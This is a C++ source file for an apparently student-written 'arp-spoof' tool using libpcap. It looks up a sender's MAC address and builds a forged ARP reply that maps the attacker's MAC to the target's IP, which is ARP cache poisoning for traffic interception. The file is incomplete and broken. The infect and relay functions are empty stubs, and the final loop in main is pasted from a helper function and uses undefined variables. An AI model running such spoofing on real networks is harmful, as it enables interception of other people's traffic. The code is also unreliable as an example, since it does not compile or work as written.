#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "EthArpPacket.h"
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <string>
#include <vector>
#include <iostream>
using namespace std;
#pragma pack(push, 1)
struct Spoof final{
    Spoof(){}
    Spoof(Ip sip, Ip tip,EthArpPacket* pckt){}
public:
	Ip sip_;
    Ip tip_;
    EthArpPacket* infctpckt;
};
#pragma pack(pop)
vector<Spoof> spoofvector;

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
}

Mac getmymac(struct ifreq ifr){
	Mac mymac=Mac(ifr.ifr_hwaddr); //using overloaded constructor
	return mymac;
}
Ip getmyip(struct ifreq ifr){
	Ip myip=Ip(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr); //using overloaded constructor
	return myip;
}
Mac getsendermac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
	EthArpPacket packet;
	const u_char* rawpacket;
	//constructing arp request packet: 'who is sip??'
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//broadcast
	packet.eth_.smac_ = mmac;//mac of mine
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = mmac;//mac of mine
	packet.arp_.sip_ = htonl(mip);//ip of mine
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //not defined
	packet.arp_.tip_ = htonl(sip);//ip of sender : target
	//send arp request
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)); 
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	int limit=0;
	while(1){
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(handle, &header, &rawpacket);
		if (res == 0) continue;
    	if (res == -1 || res == -2) {
        	printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        	exit(1);
		}
		memcpy(&packet,rawpacket,sizeof(EthArpPacket)); //recive pckt pointer 
		if(ntohs(packet.arp_.op_)==ArpHdr::Reply && ntohl(packet.arp_.sip_)==sip){//if received packet is Arpreply and ip check
			Mac resultmac=packet.arp_.smac_;
			return resultmac;
		}
		limit++; // revise: time based*** - ##thread## chrono..?
		if(limit>=3){//pcap handle waits 10ms for 5times
			std::cout<<"[Error] Cannot reach ip: "<<std::string(sip)<<", please check the <sender ip> again"<<std::endl;
			exit(1);
		}
		sleep(0);
    }
}

int isRelay(EthArpPacket* pckt){


	return 1;
}

void SendInfectFlood(EthArpPacket* pckt){

}
void SendInfect(){
	
}
int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	Ip senderip=Ip(argv[2]);
	Ip targetip=Ip(argv[3]);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf); //read_timeout 10
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet;
	EthArpPacket* receivedpckt;
	///using ioctl & ifreq to get device information
	int sock;
	struct ifreq ifr;
	struct ifreq ifr_ip;
	memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, dev);
	memset(&ifr_ip, 0x00, sizeof(ifr));
    strcpy(ifr_ip.ifr_name, dev);
 	ifr_ip.ifr_addr.sa_family = AF_INET;

    int fd=socket(AF_INET, SOCK_DGRAM, 0);
    if((sock=socket(AF_INET, SOCK_DGRAM, 0))<0){
        perror("socket ");
    }
    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
        perror("ioctl mac");
        exit(1);
    }
	if(ioctl(fd,SIOCGIFADDR,&ifr_ip)<0){
        perror("ioctl ip");
        exit(1);
    }
	close(sock);
	///
	Ip myip=getmyip(ifr_ip);
	Mac mmac=getmymac(ifr);
	Mac smac=getsendermac(handle,myip,senderip,mmac);

	packet.eth_.dmac_ = smac;//mac of sender
	packet.eth_.smac_ = mmac;//mac of mine(attacker)
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = mmac;//mac of mine(attacker)
	packet.arp_.sip_ = htonl(targetip);//ip of target
	packet.arp_.tmac_ = smac;//mac of sender
	packet.arp_.tip_ = htonl(senderip);//ip of sender
	///arp packet creation func out

	for(int i=0; i<spoofvector.size(); i++){
		printf("sending arp!!...\n");
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofvector[i].infctpckt), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}
	while(1){
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(handle, &header, reinterpret_cast<u_char**>(&receivedpckt));
		if (res == 0) continue;
    	if (res == -1 || res == -2) {
        	printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        	exit(1);
		}
		if(ntohs(packet.arp_.op_)==ArpHdr::Reply && ntohl(packet.arp_.sip_)==sip){//if received packet is Arpreply and ip check
			Mac resultmac=packet.arp_.smac_;
			return resultmac;
		}
		limit++; // revise: time based*** - ##thread## chrono..?
		if(limit>=3){//pcap handle waits 10ms for 5times
			std::cout<<"[Error] Cannot reach ip: "<<std::string(sip)<<", please check the <sender ip> again"<<std::endl;
			exit(1);
		}
		sleep(0);
    }
	pcap_close(handle);
}
